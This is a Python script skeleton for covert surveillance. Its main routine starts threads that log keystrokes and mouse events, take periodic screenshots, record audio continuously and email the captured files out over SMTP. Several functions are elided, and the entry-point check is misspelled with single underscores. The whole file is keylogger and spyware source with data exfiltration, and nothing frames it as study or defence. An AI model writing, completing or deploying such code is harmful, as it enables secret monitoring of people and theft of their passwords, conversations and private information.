import os
import sounddevice as sd
import soundfile as sf
import pyautogui
import threading
import time
from datetime import datetime
from pynput.keyboard import Listener as KeyListener, Key
from pynput.mouse import Listener as MouseListener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import ssl

# Configuration
recordings_folder = 'recordings'
screenshots_folder = 'screenshots'
keyandmouse_folder = 'key_mouse_logs'
max_recordings = 10
max_screenshots = 10
interval_seconds = 10

# ... (rest of the code)

def clean_up_files(folder, max_files, extension):
    if not os.path.exists(folder) or not os.path.isdir(folder):
        return

    files = [f for f in os.listdir(folder) if f.endswith(extension)]
    if len(files) > max_files:
        for file_to_delete in files[:len(files) - max_files]:
            os.remove(os.path.join(folder, file_to_delete))

def clean_up_folders():
    clean_up_files(recordings_folder, max_recordings, '.wav')
    clean_up_files(screenshots_folder, max_screenshots, '.png')

def main():
    clean_up_folders()

    screenshot_thread = threading.Thread(target=capture_screenshots, args=(screenshots_folder, interval_seconds))
    screenshot_thread.start()

    audio_thread = threading.Thread(target=continuous_audio_recording)
    audio_thread.start()

    email_thread = threading.Thread(target=monitor_folders_and_send_emails, args=([recordings_folder, screenshots_folder, keyandmouse_folder],))
    email_thread.start()

    with KeyListener(on_press=on_key_press, on_release=on_key_release) as key_listener:
        with MouseListener(on_click=on_mouse_click, on_move=on_mouse_move, on_scroll=on_mouse_scroll) as mouse_listener:
            key_listener.join()

if _name_ == "_main_":
    main()